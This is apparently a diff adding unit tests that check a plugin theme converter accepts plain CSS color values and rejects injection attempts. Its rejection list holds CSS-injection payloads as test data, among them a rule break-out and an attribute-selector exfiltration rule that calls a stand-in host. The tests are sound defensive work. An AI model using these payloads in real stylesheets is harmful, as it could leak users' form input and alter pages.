@@ -77,6 +77,87 @@ describe('pluginThemeToTheme', () => {
 	});
 });
 
+describe('pluginThemeToTheme color values', () => {
+	// One key per plain color form the strict check accepts.
+	const PLAIN_COLORS: Array<[keyof ThemeColors, string]> = [
+		['accent', '#abc'],
+		['accentDim', '#abcd'],
+		['bgMain', '#0b0f1a'],
+		['bgSidebar', '#0B0F1ACC'],
+		['textMain', 'rgb(255, 255, 255)'],
+		['textDim', 'rgba(255,255,255,0.6)'],
+		['border', 'rgb(68 71 90 / 50%)'],
+		['bgActivity', 'rgb(10%, 20%, 30%)'],
+		['success', 'hsl(135, 94%, 65%)'],
+		['warning', 'hsla(31, 100%, 71%, .9)'],
+		['error', 'hsl(0deg 100% 67%)'],
+		['accentText', 'rebeccapurple'],
+		['accentForeground', 'White'],
+		['selection', 'transparent'],
+		['ansiRed', 'currentColor'],
+	];
+
+	it('keeps every plain color form', () => {
+		const theme = pluginThemeToTheme(
+			contribution({ colors: Object.fromEntries(PLAIN_COLORS) }),
+			baseDark
+		);
+		for (const [key, value] of PLAIN_COLORS) {
+			expect(theme.colors[key]).toBe(value);
+		}
+	});
+
+	// Theme colors are written into `<style>` blocks. Each of these would close
+	// the declaration or rule it lands in and add CSS of its own, or reach the
+	// network from CSS (the CSP allows `img-src https:`).
+	const REJECTED: Array<[string, string]> = [
+		['the rule break-out', 'red;} * { background: url(https://x/?a'],
+		[
+			'an attribute-selector exfiltration rule',
+			'red} input[value^="a"] { background-image: url(https://x/?p=a) } .x { color: red',
+		],
+		['url()', 'url(https://x/a.png)'],
+		['url() inside a color function', 'rgb(url(https://x/), 0, 0)'],
+		['expression()', 'expression(alert(1))'],
+		['var()', 'var(--maestro-accent)'],
+		['a semicolon', 'red;'],
+		['a second declaration', '#fff; background-image: url(https://x/)'],
+		['a closing brace', '#fff}'],
+		['an opening brace', 'red{'],
+		['a backslash escape', '\\72 ed'],
+		['a trailing backslash', 'red\\'],
+		['a trailing newline', '#fff\n'],
+		['a leading newline', '\n#fff'],
+		['a newline inside rgb()', 'rgb(1,\n2, 3)'],
+		['a carriage return', '#fff\r'],
+		['a form feed', 'red\f'],
+		['a quote', '"red"'],
+		['a comment', 'red/**/'],
+		['an unknown keyword', 'inherit'],
+		['an empty string', ''],
+	];
+
+	it.each(REJECTED)('drops %s and keeps the base value', (_label, value) => {
+		const theme = pluginThemeToTheme(
+			contribution({ colors: { accent: value, bgMain: '#000000' } }),
+			baseDark
+		);
+		expect(theme.colors.accent).toBe(baseDark.accent);
+		// One bad value drops only its own key, never the theme.
+		expect(theme.colors.bgMain).toBe('#000000');
+		expect(theme.id).toBe('com.acme/midnight');
+	});
+
+	it('drops a bad value through pluginThemesToRecord too', () => {
+		const rec = pluginThemesToRecord(
+			[contribution({ colors: { textMain: 'red;} * { background: url(https://x/?a' } })],
+			baseDark,
+			baseLight
+		);
+		expect(rec['com.acme/midnight'].colors.textMain).toBe(baseDark.textMain);
+	});
+});
+
 describe('pluginThemesToRecord', () => {
 	it('keys by namespaced id and picks the base by mode', () => {
 		const rec = pluginThemesToRecord(
